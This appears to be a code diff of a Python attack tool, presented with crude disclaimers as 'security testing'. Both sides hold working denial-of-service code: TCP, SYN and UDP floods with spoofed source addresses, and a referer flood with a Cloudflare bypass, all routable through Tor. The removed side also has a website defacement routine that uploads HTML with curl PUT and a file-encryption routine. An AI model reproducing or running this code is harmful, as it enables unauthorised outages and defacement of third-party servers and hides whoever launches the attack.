@@ -1,624 +1,626 @@
 #########################################################################
- # WARNING: This tool is for EXTREMELY aggressive security testing ONLY!
- # Unauthorized use is HIGHLY illegal and will land your ass in jail, you dumb fuck!
- # Noodles Inc. is NOT responsible for your dumbass actions. Use EXTREMELY responsibly, or you're fucked!
- # THIS SOFTWARE USES A NUCLEAR COMBINATION OF DOS, DDOS AND EXPLOITS THAT WILL
- # FUCKING OBLITERATE SERVERS. USE AT YOUR OWN FUCKING RISK!
- # I AM NOT LIABLE IF YOU BLOW UP SERVERS, BREAK THE INTERNET, OR GET FUCKED BY THE COPS!
- #########################################################################
- 
-
- # LOGGING: All actions will be logged to the browser console for accountability.
- 
-
- # Color Scheme: Dark Green, Purple, Dark Red, Dark Blue
- # Script Start
- 
-
- import threading
- import socket
- import random
- import logging
- import time
- import os
- import sys
- import requests
- import socks  # Import the PySocks library
- from scapy.all import *  # Network Scanning Tools for DOS and DDOS attacks
- import traceback
- import stem.process  # For launching Tor
- from stem import Signal
- from stem.util.log import get_logger
- import urllib3
- from urllib.parse import urlparse
- import cfscrape  # Bypass Cloudflare
- from contextlib import suppress
- from queue import Queue
- import signal
- import subprocess  # For defacement tool
- import shutil  # For file backups
- import hashlib  # For secure key management
- from cryptography.fernet import Fernet
- from cryptography.hazmat.primitives import hashes
- from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
- from cryptography.hazmat.backends import default_backend
- import base64
- import asyncio  # For asynchronous operations
- import aiohttp  # For asynchronous HTTP requests
- from PyQt5.QtWidgets import QApplication, QMessageBox  # User consent popup
- 
-
- # Configuration
- TARGET = sys.argv[1] if len(sys.argv) > 1 else input("\033[32mEnter target URL: \033[0m")  # Dark Green
- parsed_url = urlparse(TARGET)
- PORT = int(sys.argv[2]) if len(sys.argv] > 2 else (443 if parsed_url.scheme == 'https' else 80)
- THREADS = int(sys.argv[3]) if len(sys.argv) > 3 else 500
- PAYLOAD_SIZE = int(sys.argv[4]) if len(sys.argv) > 4 else 65500  # MAXIMUM TCP SIZE
- TIMEOUT = 2
- USE_TOR = input("\033[32mUse Tor proxy? (y/n): \033[0m").lower() == 'y'  # Dark Green
- TOR_PORT = 9050  # Default Tor port
- CONTROL_PORT = 9051  # Tor control port
- BYPASS_CLOUDFLARE = True
- 
-
- # Global flag to control attack threads
- attack_running = True
- 
-
- # Queue for tasks
- task_queue = Queue()
- 
-
- # List to hold threads
- threads = []
- 
-
- # User Agents
- USER_AGENTS = [
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
-  "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0",
-  "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"
- ]
- 
-
- # Setup logging
- logging.basicConfig(level=logging.INFO,
-  format='%(asctime)s - %(levelname)s - %(message)s')
- 
-
- def log(message):
-  print(message)
-  logging.info(message)
- 
-
- # Function to generate a random IP address (for spoofing)
- def generate_random_ip():
-  ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
-  log(f"\033[35mGenerated spoofed IP: {ip}\033[0m")  # Purple
-  return ip
- 
-
- # Function to create a socket and send data
- def tcp_attack(target, port, use_tor=False):
-  while attack_running:
-  try:
-  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  s.settimeout(TIMEOUT)
- 
-
-  # Try to resolve domain name
-  try:
-  ip = socket.gethostbyname(target)
-  except socket.gaierror:
-  log(f"\033[31mCould not resolve host: {target}\033[0m")  # Dark Red
-  return
- 
-
-  # Connect via Tor if USE_TOR is True
-  if use_tor:
-  socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", TOR_PORT)  # Default Tor port
-  socket.socket = socks.socksocket  # Use SOCKS socket
- 
-
-  s.connect((ip, port))
- 
-
-  # Add TCP Socket options
-  s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
- 
-
-  # Build HTTP request
-  http_header = (
-  f"GET / HTTP/1.1\r\n"
-  f"Host: {target}\r\n"
-  f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-  f"X-Forwarded-For: {generate_random_ip()}\r\n"  # Spoof IP
-  f"Connection: Keep-Alive\r\n"
-  f"Cache-Control: max-age=0\r\n"
-  f"\r\n"
-  )
- 
-
-  # Build payload
-  payload = http_header + 'A' * PAYLOAD_SIZE
-  s.send(payload.encode('utf-8'))
- 
-
-  log(f"\033[34mSent {len(payload)} bytes to {target}:{port}\033[0m")  # Dark Blue
-  s.close()
- 
-
-  # Add a slight delay to avoid overwhelming the system
-  time.sleep(random.uniform(0.01, 0.1))  # Faster than before
-  except socket.error as e:
-  log(f"\033[31mSocket error: {e}\033[0m")  # Dark Red
-  except Exception as e:
-  log(f"\033[31mAn unexpected error occurred: {e}\033[0m")  # Dark Red
-  log(traceback.format_exc())
- 
-
- # Function to perform SYN flood attack
- def syn_flood(target_ip, target_port):
-  while attack_running:
-  try:
-  # Craft a SYN packet
-  ip = IP(src=generate_random_ip(), dst=target_ip)
-  syn = TCP(sport=RandShort(), dport=target_port, flags='S')
-  raw = Raw(b"X" * 65500)  # Maximum Packet Size
-  p = ip / syn / raw
- 
-
-  # Send the packet
-  send(p, verbose=0)
-  except Exception as e:
-  log(f"\033[31mAn unexpected error occurred in syn_flood: {e}\033[0m")  # Dark Red
-  log(traceback.format_exc())
- 
-
- def udp_flood(target_ip, target_port):
-  while attack_running:
-  try:
-  # Craft a UDP packet
-  ip = IP(src=generate_random_ip(), dst=target_ip)
-  udp = UDP(sport=RandShort(), dport=target_port)
-  raw = Raw(b"X" * 65500)  # Maximum Packet Size
-  p = ip / udp / raw
- 
-
-  # Send the packet
-  send(p, verbose=0)
-  except Exception as e:
-  log(f"\033[31mAn unexpected error occurred in udp_flood: {e}\033[0m")  # Dark Red
-  log(traceback.format_exc())
- 
-
- # Function to renew Tor identity
- def renew_tor_identity():
-  try:
-  with Controller.from_port(port=CONTROL_PORT) as controller:
-  controller.authenticate(password="your_tor_control_password")  # Replace with your Tor control password if set
-  controller.signal(Signal.NEWNYM)
-  log("\033[32mSuccessfully renewed Tor identity.\033[0m")  # Dark Green
-  except Exception as e:
-  log(f"\033[31mFailed to renew Tor identity: {e}\033[0m")  # Dark Red
- 
-
- # List of Referers (Modified)
- referers = [
-  "https://www.facebook.com/l.php?u=",
-  "https://www.facebook.com/sharer/sharer.php?u=",
-  "https://drive.google.com/viewerng/viewer?url=",
-  "http://www.google.com/translate?u=",
-  "https://developers.google.com/speed/pagespeed/insights/?url=",
-  "http://www.bing.com/search?q=",
-  "https://www.google.com/",
-  "https://check-host.net/",
-  "https://www.facebook.com/",
-  "https://www.youtube.com/",
-  "https://r.search.yahoo.com/",
-  "https://steamcommunity.com/market/search?q=",
-  "https://www.ted.com/search?q=",
-  "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7",
-  "https://www.google.com/",
-  "https://www.cloudflare.com/",  # Bypass Cloudflare
-  "https://www.bing.com/",
-  "https://yandex.com/",
-  "https://duckduckgo.com/",
-  "https://www.baidu.com/",
-  "https://www.yahoo.com/",
-  "https://www.ask.com/",
-  "https://www.aol.com/",
-  "https://www.lycos.com/",
-  "https://www.excite.com/",
-  "https://www.infospace.com/",
-  "https://metacrawler.com/",
-  "https://www.dogpile.com/",
-  "https://www.startpage.com/",
-  "https://www.searchencrypt.com/",
-  "https://gigablast.com/",
-  "https://swisscows.com/",
-  "https://www.qwant.com/",
-  "https://www.ecosia.org/",
-  "https://search.brave.com/",
-  "http://web.archive.org/",
-  "https://www.alexa.com/siteinfo/",
-  "https://builtwith.com/",
-  "https://www.similarweb.com/website/",
-  "https://www.whois.com/whois/",
-  "https://securitytrails.com/domain/",
-  "https://www.shodan.io/search?query=",
-  "https://censys.io/ipv4?q=",
-  "https://otx.alienvault.com/browse/global",
-  "https://urlscan.io/result/",
-  "https://virustotal.com/gui/home/upload",
-  "https://www.abuseipdb.com/check/",
-  "https://talosintelligence.com/reputation_center/lookup?search=",
-  "https://mxtoolbox.com/SuperTool.aspx?action=mx%3a&run=toolpage",
-  "https://bgp.he.net/dns/",
-  "https://www.ultratools.com/tools/ping",
-  "https://www.site24x7.com/check-website-availability.html",
-  "https://tools.keycdn.com/ping",
-  "https://www.uptrends.com/tools/uptime-test",
-  "https://www.dotcom-monitor.com/website-speed-test",
-  "https://gtmetrix.com/",
-  "https://developers.google.com/speed/pagespeed/insights/"
- ]
- 
-
- def generate_referer():
-  return random.choice(referers)
- 
-
- # Function to bypass Cloudflare's Anti-DDoS measures
- def bypass_cloudflare(url):
-  try:
-  # Use cfscrape to bypass Cloudflare
-  scraper = cfscrape.create_scraper()
-  response = scraper.get(url, timeout=10)
- 
-
-  # Check if the request was successful
-  if response.status_code == 200:
-  log("\033[32mSuccessfully bypassed Cloudflare.\033[0m")  # Dark Green
-  return True
-  else:
-  log(f"\033[31mFailed to bypass Cloudflare. Status code: {response.status_code}\033[0m")  # Dark Red
-  return False
-  except cfscrape.exceptions.CloudflareChallengeError as e:
-  log(f"\033[31mCloudflare challenge error: {e}\033[0m")  # Dark Red
-  return False
-  except requests.exceptions.RequestException as e:
-  log(f"\033[31mRequest error: {e}\033[0m")  # Dark Red
-  return False
-  except Exception as e:
-  log(f"\033[31mAn unexpected error occurred during Cloudflare bypass: {e}\033[0m")
-  log(traceback.format_exc())
-  return False
- 
-
- def referer_attack(target, use_tor=False):
-  while attack_running:
-  try:
-  referer = generate_referer()
-  # Setup proxy if USE_TOR is True
-  proxies = {}
-  if use_tor:
-  proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
- 
-
-  if BYPASS_CLOUDFLARE:
-  bypassed = bypass_cloudflare(target)
-  if bypassed:
-  log("\033[32mSuccessfully bypassed Cloudflare.\033[0m")  # Dark Green
-  else:
-  log("\033[31mFailed to bypass Cloudflare.\033[0m")  # Dark Red
- 
-
-  requests.get(target, headers={'Referer': referer, 'User-Agent': random.choice(USER_AGENTS)}, proxies=proxies, timeout=TIMEOUT)
-  log(f"\033[34mSent referer: {referer} to {target}\033[0m")  # Dark Blue
-  except requests.exceptions.RequestException as e:
-  log(f"\033[31mRequest error: {e}\033[0m")  # Dark Red
-  except Exception as e:
-  log(f"\033[31mAn unexpected error occurred: {e}\033[0m")  # Dark Red
-  log(traceback.format_exc())
-  time.sleep(random.uniform(0.01, 0.1))  # Faster Rate
- 
-
- def worker():
-  while True:
-  task = task_queue.get()
-  try:
-  task()
-  except Exception as e:
-  log(f"\033[31mError executing task: {e}\033[0m")
-  log(traceback.format_exc())
-  finally:
-  task_queue.task_done()
- 
-
- def start_attack(target, port, threads, use_tor):
-  global attack_running, threads
-  attack_running = True
- 
-
-  # Start threads for TCP attack
-  for _ in range(threads):
-  task_queue.put(lambda: tcp_attack(target, port, use_tor))
-  # Start threads for SYN flood
-  task_queue.put(lambda: syn_flood(target, port))
-  # Start threads for UDP flood
-  task_queue.put(lambda: udp_flood(target, port))
-  # Start threads for referer attacks
-  task_queue.put(lambda: referer_attack(target, use_tor))
-  log(f"\033[32mStarting referer attack on {target} with {threads} threads...\033[0m")  # Dark Green
-  log(f"\033[32mStarting DDoS attack on {TARGET}:{PORT} with {THREADS} threads...\033[0m")  # Dark Green
- 
-
-  # Create worker threads
-  for _ in range(threads * 4):  # Multiply by 4 since there are 4 types of attacks
-  t = threading.Thread(target=worker)
-  t.daemon = True
-  threads.append(t)
-  t.start()
- 
-
- def stop_attack():
-  global attack_running
-  attack_running = False
-  task_queue.join()  # Wait for all tasks to be completed
-  for t in threads:
-  t.join(timeout=1)  # Wait for threads to finish
- 
-
-  log("\033[31mStopping all attack threads...\033[0m")
- 
-
- def signal_handler(sig, frame):
-  print("\nCtrl+C detected. Stopping the attack...")
-  stop_attack()
-  sys.exit(0)
- 
-
- #-----------------------------------------------------------------------------------------------------------------------
- #                                               Defacement Tool
- #-----------------------------------------------------------------------------------------------------------------------
- 
-
- def backup_website(url):
-  try:
-  # Create a directory to store backups
-  backup_dir = "website_backups"
-  if not os.path.exists(backup_dir):
-  os.makedirs(backup_dir)
- 
-
-  # Fetch the website content
-  response = requests.get(url)
-  response.raise_for_status()  # Raise HTTPError for bad responses (4xx or 5xx)
- 
-
-  # Create a unique filename for the backup
-  timestamp = time.strftime("%Y%m%d-%H%M%S")
-  filename = f"{urlparse(url).netloc}-{timestamp}.html"
-  filepath = os.path.join(backup_dir, filename)
- 
-
-  # Save the content to the file
-  with open(filepath, "wb") as f:
-  f.write(response.content)
- 
-
-  log(f"\033[32mWebsite backed up successfully to {filepath}\033[0m")  # Dark Green
-  return filepath
- 
-
-  except requests.exceptions.RequestException as e:
-  log(f"\033[31mRequest error during backup: {e}\033[0m")  # Dark Red
-  return None
-  except Exception as e:
-  log(f"\033[31mAn unexpected error occurred during backup: {e}\033[0m")  # Dark Red
-  log(traceback.format_exc())
-  return None
- 
-
- def restore_website(filepath, url):
-  try:
-  with open(filepath, "rb") as f:
-  content = f.read()
- 
-
-  # Defacement code would typically involve writing this content back to the server.
-  # Since I can't directly modify a server, I'll simulate the process.
-  log(f"\033[32mSimulating website restoration from {filepath} to {url}\033[0m")  # Dark Green
-  # In a real scenario, you would upload this content to the web server,
-  # potentially using FTP, SSH, or an API.
- 
-
-  except FileNotFoundError:
-  log(f"\033[31mBackup file not found: {filepath}\033[0m")  # Dark Red
-  except Exception as e:
-  log(f"\033[31mAn unexpected error occurred during restoration: {e}\033[0m")  # Dark Red
-  log(traceback.format_exc())
- 
-
- def deface_website(url, html_code):
-  try:
-  # Save the HTML code to a file
-  filename = "defacement.html"
-  with open(filename, "w", encoding="utf-8") as f:
-  f.write(html_code)
- 
-
-  # Use curl to upload the defacement code to the website
-  command = ["curl", "-X", "PUT", "--data-binary", f"@{filename}", url]
-  result = subprocess.run(command, capture_output=True, text=True)
- 
-
-  if result.returncode == 0:
-  log(f"\033[32mWebsite defaced successfully: {url}\033[0m")  # Dark Green
-  log(f"\033[32m{result.stdout}\033[0m")
-  else:
-  log(f"\033[31mFailed to deface website: {url}\033[0m")  # Dark Red
-  log(f"\033[31m{result.stderr}\033[0m")
- 
-
-  except FileNotFoundError:
-  log(f"\033[31mDefacement file not found: {filename}\033[0m")  # Dark Red
-  except Exception as e:
-  log(f"\033[31mAn unexpected error occurred during defacement: {e}\033[0m")  # Dark Red
-  log(traceback.format_exc())
- 
-
- #-----------------------------------------------------------------------------------------------------------------------
- #                                               File Encryption Tool
- #-----------------------------------------------------------------------------------------------------------------------
- 
-
- def generate_key(password, salt=None):
-  """Generates a secure encryption key from the password and salt."""
-  if salt is None:
-  salt = os.urandom(16)  # Generate a new salt if none is provided
- 
-
-  password_encoded = password.encode()
-  kdf = PBKDF2HMAC(
-  algorithm=hashes.SHA256(),
-  length=32,  # 32 bytes for Fernet key
-  salt=salt,
-  iterations=100000,  # High iteration count for security
-  backend=default_backend()
-  )
-  key = base64.urlsafe_b64encode(kdf.derive(password_encoded))
-  return key, salt
- 
-
- def encrypt_file(filepath, password):
-  """Encrypts a file using a secure key derived from the password."""
-  try:
-  # Generate a key and salt
-  key, salt = generate_key(password)
- 
-
-  # Create a Fernet cipher object with the key
-  f = Fernet(key)
- 
-
-  # Read the file content
-  with open(filepath, "rb") as file:
-  file_data = file.read()
- 
-
-  # Encrypt the data
-  encrypted_data = f.encrypt(file_data)
- 
-
-  # Create a backup of the original file
-  backup_filepath = filepath + ".bak"
-  shutil.copy(filepath, backup_filepath)
-  log(f"\033[32mOriginal file backed up to {backup_filepath}\033[0m")  # Dark Green
- 
-
-  # Write the encrypted data to the file, along with the salt
-  with open(filepath, "wb") as file:
-  file.write(salt)  # Write the salt
-  file.write(encrypted_data)  # Write the encrypted data
- 
-
-  log(f"\033[32mFile encrypted successfully: {filepath}\033[0m")  # Dark Green
-  return True
- 
-
-  except Exception as e:
-  log(f"\033[31mAn unexpected error occurred during encryption: {e}\033[0m")  # Dark Red
-  log(traceback.format_exc())
-  return False
- 
-
- def decrypt_file(filepath, password):
-  """Decrypts a file using the password and salt."""
-  try:
-  # Read the salt and encrypted data from the file
-  with open(filepath, "rb") as file:
-  salt = file.read(16)  # Read the salt (first 16 bytes)
-  encrypted_data = file.read()  # Read the rest of the data
- 
-
-  # Generate the key using the password and salt
-  key, _ = generate_key(password, salt)
- 
-
-  # Create a Fernet cipher object with the key
-  f = Fernet(key)
- 
-
-  # Decrypt the data
-  decrypted_data = f.decrypt(encrypted_data[16:])
- 
-
-  # Write the decrypted data to the file
-  with open(filepath, "wb") as file:
-  file.write(decrypted_data)
- 
-
-  log(f"\033[32mFile decrypted successfully: {filepath}\033[0m")  # Dark Green
-  return True
- 
-
-  except Exception as e:
-  log(f"\033[31mAn unexpected error occurred during decryption: {e}\033[0m")  # Dark Red
-  log(traceback.format_exc())
-  return False
- 
-
- #-----------------------------------------------------------------------------------------------------------------------
- #                                               Main Function
- #-----------------------------------------------------------------------------------------------------------------------
- 
-
- if __name__ == "__main__":
-  # Consent popup
-  app = QApplication(sys.argv)
-  msg = QMessageBox()
-  msg.setIcon(QMessageBox.Warning)
-  msg.setText("WARNING: This tool is for aggressive security testing only. Unauthorized use is illegal. Noodles Inc. is NOT responsible for your actions.")
-  msg.setWindowTitle("Noodles Inc. Disclaimer")
-  msg.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
-  reply = msg.exec_()
- 
-
-  if reply == QMessageBox.No:
-  print("User declined consent. Exiting...")
-  sys.exit()
- 
-
-  signal.signal(signal.SIGINT, signal_handler)
-  print("Type 'start' to begin the DDoS attack, 'stop' to end it, 'backup' to back up website, 'restore' to restore, 'deface' to deface, 'encrypt' to encrypt file, or 'decrypt' to decrypt file.")
-  while True:
-  command = input("> ").lower()
-  if command == 'start':
-  start_attack(TARGET, PORT, THREADS, USE_TOR)
-  elif command == 'stop':
-  stop_attack()
-  elif command == 'backup':
-  url = input("Enter website URL to backup: ")
-  backup_website(url)
-  elif command == 'restore':
-  filepath = input("Enter backup filepath: ")
-  url = input("Enter target URL to restore: ")
-  restore_website(filepath, url)
-  elif command == 'deface':
-  url = input("Enter website URL to deface: ")
-  html_code = input("Enter HTML code for defacement: ")
-  deface_website(url, html_code)
-  elif command == 'encrypt':
-  filepath = input("Enter file path to encrypt: ")
-  password = input("Enter password for encryption: ")
-  encrypt_file(filepath, password)
-  elif command == 'decrypt':
-  filepath = input("Enter file path to decrypt: ")
-  password = input("Enter password for decryption: ")
-  decrypt_file(filepath, password)
-  else:
-  print("Invalid command. Use 'start', 'stop', 'backup', 'restore', 'deface', 'encrypt' or 'decrypt'.")
+# WARNING: This tool is for EXTREMELY aggressive security testing ONLY!
+# Unauthorized use is HIGHLY illegal and will land your ass in jail, you dumb fuck!
+# Noodles Inc. is NOT responsible for your dumbass actions. Use EXTREMELY responsibly, or you're fucked!
+# THIS SOFTWARE USES A NUCLEAR COMBINATION OF DOS, DDOS AND EXPLOITS THAT WILL
+# FUCKING OBLITERATE SERVERS. USE AT YOUR OWN FUCKING RISK!
+# I AM NOT LIABLE IF YOU BLOW UP SERVERS, BREAK THE INTERNET, OR GET FUCKED BY THE COPS!
+#########################################################################
+
+# LOGGING: All actions will be logged to the browser console for accountability.
+
+# Color Scheme: Dark Green, Purple, Dark Red, Dark Blue
+# Script Start
+
+import threading
+import socket
+import random
+import logging
+import time
+import os
+import sys
+import requests
+import socks  # Import the PySocks library
+from scapy.all import *  # Network Scanning Tools for DOS and DDOS attacks
+import traceback
+import stem.process  # For launching Tor
+from stem import Signal
+from stem.util.log import get_logger
+import urllib3
+from urllib.parse import urlparse
+import cfscrape  # Bypass Cloudflare
+from contextlib import suppress
+from queue import Queue
+import signal
+import subprocess  # For defacement tool
+import shutil  # For file backups
+import hashlib  # For secure key management
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+from cryptography.hazmat.backends import default_backend
+import base64
+import asyncio  # For asynchronous operations
+import aiohttp  # For asynchronous HTTP requests
+from PyQt5.QtWidgets import QApplication, QMessageBox  # User consent popup
+from PyQt5.QtCore import Qt, QTimer
+from PyQt5.QtGui import QPalette, QColor
+
+# Configuration
+TARGET = sys.argv[1] if len(sys.argv) > 1 else input("\033[32mEnter target URL: \033[0m")  # Dark Green
+parsed_url = urlparse(TARGET)
+PORT = int(sys.argv[2]) if len(sys.argv) > 2 else (443 if parsed_url.scheme == 'https' else 80)
+THREADS = int(sys.argv[3]) if len(sys.argv) > 3 else 500
+PAYLOAD_SIZE = int(sys.argv[4]) if len(sys.argv) > 4 else 65500  # MAXIMUM TCP SIZE
+TIMEOUT = 2
+USE_TOR = input("\033[32mUse Tor proxy? (y/n): \033[0m").lower() == 'y'  # Dark Green
+TOR_PORT = 9050  # Default Tor port
+CONTROL_PORT = 9051  # Tor control port
+BYPASS_CLOUDFLARE = True
+
+# Global flag to control attack threads
+attack_running = True
+
+# Queue for tasks
+task_queue = Queue()
+
+# List to hold threads
+threads = []
+
+# User Agents
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0",
+    "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"
+]
+
+# Setup logging
+logging.basicConfig(level=logging.INFO,
+                    format='%(asctime)s - %(levelname)s - %(message)s')
+
+
+def log(message):
+    print(message)
+    logging.info(message)
+
+
+# Function to generate a random IP address (for spoofing)
+def generate_random_ip():
+    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
+    log(f"\033[35mGenerated spoofed IP: {ip}\033[0m")  # Purple
+    return ip
+
+
+# Function to create a socket and send data
+def tcp_attack(target, port, use_tor=False):
+    while attack_running:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(TIMEOUT)
+
+            # Try to resolve domain name
+            try:
+                ip = socket.gethostbyname(target)
+            except socket.gaierror:
+                log(f"\033[31mCould not resolve host: {target}\033[0m")  # Dark Red
+                return
+
+            # Connect via Tor if USE_TOR is True
+            if use_tor:
+                socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", TOR_PORT)  # Default Tor port
+                socket.socket = socks.socksocket  # Use SOCKS socket
+
+            s.connect((ip, port))
+
+            # Add TCP Socket options
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+
+            # Build HTTP request
+            http_header = (
+                f"GET / HTTP/1.1\r\n"
+                f"Host: {target}\r\n"
+                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
+                f"X-Forwarded-For: {generate_random_ip()}\r\n"  # Spoof IP
+                f"Connection: Keep-Alive\r\n"
+                f"Cache-Control: max-age=0\r\n"
+                f"\r\n"
+            )
+
+            # Build payload
+            payload = http_header + 'A' * PAYLOAD_SIZE
+            s.send(payload.encode('utf-8'))
+
+            log(f"\033[34mSent {len(payload)} bytes to {target}:{port}\033[0m")  # Dark Blue
+            s.close()
+
+            # Add a slight delay to avoid overwhelming the system
+            time.sleep(random.uniform(0.01, 0.1))  # Faster than before
+        except socket.error as e:
+            log(f"\033[31mSocket error: {e}\033[0m")  # Dark Red
+        except Exception as e:
+            log(f"\033[31mAn unexpected error occurred: {e}\033[0m")  # Dark Red
+            log(traceback.format_exc())
+
+
+# Function to perform SYN flood attack
+def syn_flood(target_ip, target_port):
+    while attack_running:
+        try:
+            # Craft a SYN packet
+            ip = IP(src=generate_random_ip(), dst=target_ip)
+            syn = TCP(sport=RandShort(), dport=target_port, flags='S')
+            raw = Raw(b"X" * 65500)  # Maximum Packet Size
+            p = ip / syn / raw
+
+            # Send the packet
+            send(p, verbose=0)
+        except Exception as e:
+            log(f"\033[31mAn unexpected error occurred in syn_flood: {e}\033[0m")  # Dark Red
+            log(traceback.format_exc())
+
+
+def udp_flood(target_ip, target_port):
+    while attack_running:
+        try:
+            # Craft a UDP packet
+            ip = IP(src=generate_random_ip(), dst=target_ip)
+            udp = UDP(sport=RandShort(), dport=target_port)
+            raw = Raw(b"X" * 65500)  # Maximum Packet Size
+            p = ip / udp / raw
+
+            # Send the packet
+            send(p, verbose=0)
+        except Exception as e:
+            log(f"\033[31mAn unexpected error occurred in udp_flood: {e}\033[0m")  # Dark Red
+            log(traceback.format_exc())
+
+
+# Function to renew Tor identity
+def renew_tor_identity():
+    try:
+        with Controller.from_port(port=CONTROL_PORT) as controller:
+            controller.authenticate(password="your_tor_control_password")  # Replace with your Tor control password if set
+            controller.signal(Signal.NEWNYM)
+            log("\033[32mSuccessfully renewed Tor identity.\033[0m")  # Dark Green
+    except Exception as e:
+        log(f"\033[31mFailed to renew Tor identity: {e}\033[0m")  # Dark Red
+
+
+# List of Referers (Modified)
+referers = [
+    "https://www.facebook.com/l.php?u=",
+    "https://www.facebook.com/sharer/sharer.php?u=",
+    "https://drive.google.com/viewerng/viewer?url=",
+    "http://www.google.com/translate?u=",
+    "https://developers.google.com/speed/pagespeed/insights/?url=",
+    "http://www.bing.com/search?q=",
+    "https://www.google.com/",
+    "https://check-host.net/",
+    "https://www.facebook.com/",
+    "https://www.youtube.com/",
+    "https://r.search.yahoo.com/",
+    "https://steamcommunity.com/market/search?q=",
+    "https://www.ted.com/search?q=",
+    "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7",
+    "https://www.google.com/",
+    "https://www.cloudflare.com/",  # Bypass Cloudflare
+    "https://www.bing.com/",
+    "https://yandex.com/",
+    "https://duckduckgo.com/",
+    "https://www.baidu.com/",
+    "https://www.yahoo.com/",
+    "https://www.ask.com/",
+    "https://www.aol.com/",
+    "https://www.lycos.com/",
+    "https://www.excite.com/",
+    "https://www.infospace.com/",
+    "https://metacrawler.com/",
+    "https://www.dogpile.com/",
+    "https://www.startpage.com/",
+    "https://www.searchencrypt.com/",
+    "https://gigablast.com/",
+    "https://swisscows.com/",
+    "https://www.qwant.com/",
+    "https://www.ecosia.org/",
+    "https://search.brave.com/",
+    "http://web.archive.org/",
+    "https://www.alexa.com/siteinfo/",
+    "https://builtwith.com/",
+    "https://www.similarweb.com/website/",
+    "https://www.whois.com/whois/",
+    "https://securitytrails.com/domain/",
+    "https://www.shodan.io/search?query=",
+    "https://censys.io/ipv4?q=",
+    "https://otx.alienvault.com/browse/global",
+    "https://urlscan.io/result/",
+    "https://virustotal.com/gui/home/upload",
+    "https://www.abuseipdb.com/check/",
+    "https://talosintelligence.com/reputation_center/lookup?search=",
+    "https://mxtoolbox.com/SuperTool.aspx?action=mx%3a&run=toolpage",
+    "https://bgp.he.net/dns/",
+    "https://www.ultratools.com/tools/ping",
+    "https://www.site24x7.com/check-website-availability.html",
+    "https://tools.keycdn.com/ping",
+    "https://www.uptrends.com/tools/uptime-test",
+    "https://www.dotcom-monitor.com/website-speed-test",
+    "https://gtmetrix.com/",
+    "https://developers.google.com/speed/pagespeed/insights/"
+]
+
+
+def generate_referer():
+    return random.choice(referers)
+
+
+# Function to bypass Cloudflare's Anti-DDoS measures
+def bypass_cloudflare(url):
+    try:
+        # Use cfscrape to bypass Cloudflare
+        scraper = cfscrape.create_scraper()
+        response = scraper.get(url, timeout=10)
+
+        # Check if the request was successful
+        if response.status_code == 200:
+            log("\033[32mSuccessfully bypassed Cloudflare.\033[0m")  # Dark Green
+            return True
+        else:
+            log(f"\033[31mFailed to bypass Cloudflare. Status code: {response.status_code}\033[0m")  # Dark Red
+            return False
+    except cfscrape.exceptions.CloudflareChallengeError as e:
+        log(f"\033[31mCloudflare challenge error: {e}\033[0m")  # Dark Red
+        return False
+    except requests.exceptions.RequestException as e:
+        log(f"\033[31mRequest error: {e}\033[0m")  # Dark Red
+        return False
+    except Exception as e:
+        log(f"\033[31mAn unexpected error occurred during Cloudflare bypass: {e}\033[0m")
+        log(traceback.format_exc())
+        return False
+
+
+def referer_attack(target, use_tor=False):
+    while attack_running:
+        try:
+            referer = generate_referer()
+            # Setup proxy if USE_TOR is True
+            proxies = {}
+            if use_tor:
+                proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
+
+            if BYPASS_CLOUDFLARE:
+                bypassed = bypass_cloudflare(target)
+                if bypassed:
+                    log("\033[32mSuccessfully bypassed Cloudflare.\033[0m")  # Dark Green
+                else:
+                    log("\033[31mFailed to bypass Cloudflare.\033[0m")  # Dark Red
+
+            requests.get(target, headers={'Referer': referer, 'User-Agent': random.choice(USER_AGENTS)},
+                         proxies=proxies, timeout=TIMEOUT)
+            log(f"\033[34mSent referer: {referer} to {target}\033[0m")  # Dark Blue
+        except requests.exceptions.RequestException as e:
+            log(f"\033[31mRequest error: {e}\033[0m")  # Dark Red
+        except Exception as e:
+            log(f"\033[31mAn unexpected error occurred: {e}\033[0m")  # Dark Red
+            log(traceback.format_exc())
